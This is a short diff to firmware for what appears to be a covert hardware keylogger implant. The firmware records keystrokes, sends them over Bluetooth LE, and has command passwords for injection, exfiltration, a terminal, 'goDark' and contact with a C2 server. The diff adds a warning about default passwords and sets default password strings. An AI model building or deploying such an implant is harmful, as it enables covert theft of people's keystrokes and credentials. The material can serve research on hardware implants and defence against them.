@@ -1,4 +1,10 @@
 /*
+ *  WARNING: out of the box this file contains default passwords
+ *  please modify the password string variables below, and update ihide.py to match
+ *  using the default passwords means anyone with the default password can interact with your implant
+ *  making it not only detectable, but also susceptible to hijack
+ *
+ *
  * Receive ASCII text from Serial1 and convert to USB HID report.
  * Send HID report out USB interface.
  * Maps out keystrokes and sends out data over ble when a central device is connected
@@ -37,25 +43,27 @@ unsigned long currentMillis;
 unsigned long elapsedMillis;
 
 //password variables
-String activatePW = "<<EXFIL_OFF_PASSWORD>>";
-String getModesPW = "<<EXFIL_OFF_PASSWORD>>";
-String recKeysEnablePW = "<<EXFIL_OFF_PASSWORD>>";
-String recKeysDisablePW = "<<EXFIL_OFF_PASSWORD>>";
-String txKeysPW = "<<EXFIL_OFF_PASSWORD>>";
-String disableKeyTxPW = "<<EXFIL_OFF_PASSWORD>>";
-String insomniaPW = "<<EXFIL_OFF_PASSWORD>>";
-String allowSleepPW = "<<EXFIL_OFF_PASSWORD>>";
-String goDarkPW = "<<EXFIL_OFF_PASSWORD>>";
-String injectPW = "<<EXFIL_OFF_PASSWORD>>";
-String rxScriptPW = "<<EXFIL_OFF_PASSWORD>>";
-String resetPW = "<<EXFIL_OFF_PASSWORD>>";
-String deletePW = "<<EXFIL_OFF_PASSWORD>>";
-String sendKeysPW = "<<EXFIL_OFF_PASSWORD>>";
-String printFilesPW = "<<EXFIL_OFF_PASSWORD>>";
-String terminalPW = "<<EXFIL_OFF_PASSWORD>>";
-String terminalPWOFF = "<<TERMINAL_OFF_PASSWORD>>";
-String exfilPW = "<<EXFIL_OFF_PASSWORD>>";
-String exfilPWOFF = "<<EXFIL_OFF_PASSWORD>>";
+//change these strings to make the implant secure
+//make sure to update ihide.py to match
+String activatePW = "DEFAULTactivatePW";
+String getModesPW = "DEFAULTgetModesPW";
+String recKeysEnablePW = "DEFAULTrecKeysEnablePW";
+String recKeysDisablePW = "DEFAULTrecKeysDisablePW";
+String txKeysPW = "DEFAULTtxKeysPW";
+String disableKeyTxPW = "DEFAULTdisableKeyTxPW";
+String insomniaPW = "DEFAULTinsomniaPW";
+String allowSleepPW = "DEFAULTallowSleepPW";
+String goDarkPW = "DEFAULTgoDarkPW";
+String injectPW = "DEFAULTinjectPW";
+String rxScriptPW = "DEFAULTrxScriptPW";
+String resetPW = "DEFAULTresetPW";
+String deletePW = "DEFAULTdeletePW";
+String sendKeysPW = "DEFAULTsendKeysPW";
+String printFilesPW = "DEFAULTprintFilesPW";
+String terminalPW = "DEFAULTterminalPW";
+String terminalPWOFF = "DEFAULTterminalPWOFF";
+String exfilPW = "DEFAULTexfilPW";
+String exfilPWOFF = "DEFAULTexfilPWOFF";
 
 //Toggle variables
 bool activate = false; //allow outgoing communication with C2
